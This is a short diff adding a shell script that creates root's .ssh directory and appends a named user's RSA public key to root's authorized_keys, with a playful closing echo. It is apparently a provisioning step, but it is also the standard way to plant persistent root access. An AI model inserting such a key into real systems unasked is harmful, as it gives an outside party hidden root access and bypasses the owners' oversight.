@@ -1,0 +1,7 @@
+set -eux
+
+sudo mkdir -p /root/.ssh
+
+sudo su root -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCz54a9Yt1u3Crn1xs13uS8u6g/p/MzTvXN78vZWejkdV0HVIJN0+kHFRkz7eOW51z/HDb94h4ru+Xzqn1S7nirNS93QyySHwPooKcQ4dEq9I0dKkLEKXRB8AweytxAnOqLcfm1ZRb+bl5XLBAzImNV8LiidEeuasosRbLTvhv0yPgYRQkbru3syLwqDvarBL3JcKLPGlIgxM8mP21UOWOoaDO3OoaSQFrE9DVH153IXRvz5S6HXa13eEVUbwzyPrEBGjUzmpX1O3//Ry7nIKwy6AyKGA1Z/u+/89GvOORROghs6F33PGYr3ZYx5ZbF850zNzvVm4ddm0SYS35fz70h psycojoker@dolgoff" >> /root/.ssh/authorized_keys'
+
+echo "swag"
